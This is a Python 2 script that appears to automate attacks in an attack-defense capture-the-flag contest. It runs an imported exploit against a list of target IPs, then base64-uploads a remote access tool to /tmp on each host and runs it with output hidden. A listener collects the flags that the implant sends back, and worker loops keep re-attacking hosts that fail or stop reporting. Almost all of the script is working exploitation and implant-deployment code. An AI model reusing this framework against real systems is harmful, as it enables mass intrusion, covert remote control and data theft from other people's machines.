#coding:utf-8
from exp import *
import base64
from multiprocessing import Process
from suber import *
import threading
from sqltools import *
import os
import time






port = 9999
targets=["202.112.51.152",\
"202.112.51.151",\
"127.0.0.1",
# "202.112.51.152",\
]
tarlist=[]

def encodefile(filename):
    ufile = open(filename,"r")
    whole = ufile.read()
    # return whole.encode("base64","strict")
    return base64.b64encode(whole)



# k = encodefile("./rat.py")
# print k
# print k.decode("base64","strict")


def upload(src,target):
    # cmd = "echo "+encodefile("./rat.py")+" > /tmp/ratb64"
    cmd = '''\
python -c '
import base64
res = base64.b64decode("{content}")
f=open("{target}","w")
f.write(res)
'\
'''.format(content = encodefile(src),target=target)

    print cmd
    sel(cmd)


def run(target):
    sel("python {target} 1>/dev/null 2>/dev/null".format(target=target))

# def decodefile

# raw_input()



def scan(targets):
    for target in targets:
        try:
            exploit(target,port)
            sel("ls")
            print raw_r()
            # print raw_r()
            print raw_r()

            upload("./rat.py","/tmp/xxme.py")
            run("/tmp/xxme.py")


            clsconnection()
            updatedb("./our.db",target,"expsucceed","none")

            # shell()

        except:
            log.warn("fail at %s"%target)
            updatedb("./our.db",target,"expfail","none")


# global p


# def monitor():

    

def initdb(name):
    try:
        os.remove(name)
    except:
        pass

    conn = sqlite3.connect(name)
    cursor = conn.cursor()
    cursor.execute('create table awd (ip varchar(20), status varchar(20), flag varchar(40),tick int)')
    # cursor.execute('insert into user (ip, state,flag) values ("123.123.123.11", "init","{fadsfasdfj}")')
    cursor.close()
    conn.commit()
    conn.close()




#["ip","exp status","flag","rat status"]
def init_target_list(targets):
    target_list_structure = []
    for target in targets:
        target_list_structure.append([target,"init","none"])
    return target_list_structure



class Handler_ckx(StreamRequestHandler):
    def handle(self):
        addr = self.request.getpeername()
        # print 'pid:',os.getpid()  #当前线程id
        # print 'connection:', addr
        ip=addr[0]
        try:
            idx=targets.index(ip)
            # print idx
            flag=self.request.recv(100)
            updatedb("./our.db",ip,"RAT_OK",flag)
            
            # tarlist[idx][1]="get"
            # tarlist[idx][2]=flag
            # print 'flag is %s '% flag
            # print tarlist
        except:
            pass

        # submit(flag,TOKEN)
        # sleep(10)  #处理函数写在这里
        # print os.getpid(),' is end.....'




# arg1=123
def heartbeat():
    while 1:
        if(int(time.time())%3==0):

            conn=sqlite3.connect("./our.db")
            cursor = conn.execute("SELECT ip,tick FROM awd WHERE status GLOB 'RAT_O*'")
            # print row
            for row in cursor:
                updatedb("./our.db",row[0],"RAT_OK_WAIT","wait_flag",tick=row[1]+1)
            # localtime = time.asctime( time.localtime(time.time()) )
            conn.close()
        sleep(1)

def keepit():
    while 1:
        # print ":aadsfasdfasd"
        targets=[]
        if(int(time.time())%2==0):
            print "keeper ....."
            conn=sqlite3.connect("./our.db")
            cursor = conn.execute("SELECT ip FROM awd WHERE tick > 3")
            for row in cursor:
                print "///////////\\n\n\n\n\n"
                targets.append(row[0])
            conn.close()
            scan(targets)

            # pass
        sleep(1)   

def fail_but_attack():
    while 1:
        stubborn_targets=[]
        if(int(time.time())%5==0):
            conn=sqlite3.connect("./our.db")

            cursor = conn.execute("SELECT ip FROM awd WHERE status GLOB 'expfai*'")
            for row in cursor:
                stubborn_targets.append(row[0])
            print "attack again..."
            scan(stubborn_targets)
        sleep(3)
                

def recv_server():
    tarlist[0][1]="ggg"
    IP="" #为空不限制IP
    PORT=9001
    TOKEN="i_am_ckxckxckx"
    MAXWORKERS=100  #最大进程数量
    #实例化服务类对象
    server = Server(
        server_address=(IP,PORT),     # address
        RequestHandlerClass=Handler_ckx             # 请求类
    )
    server.allow_reuse_address=True
    server.max_children =MAXWORKERS     #这个很重要，默认max_children为40，根据性能需求设置
    #开启服务
    server.serve_forever()
    server.server_close()
    





# init our database
initdb("./our.db")



p_scan=Process(target=scan,args=(targets,))
p_recv=Process(target=recv_server,args=())
p_heartbeat=Process(target=heartbeat)
p_keepit=Process(target=keepit)
p_stillattack=Process(target=fail_but_attack)

tarlist=init_target_list(targets)
for i in tarlist:
    insertdb("./our.db",i[0],i[1],i[2])



lookup("./our.db")
# raw_input()


print "start listening...."



p_scan.start()
raw_input()
p_recv.start()
p_heartbeat.start()
p_keepit.start()
p_stillattack.start()

sleep(1)
while 1:
    print "\n"*9
    try:
        lookup("./our.db")
    except:
        print "tarlist is null"
    sleep(1)
print "main"







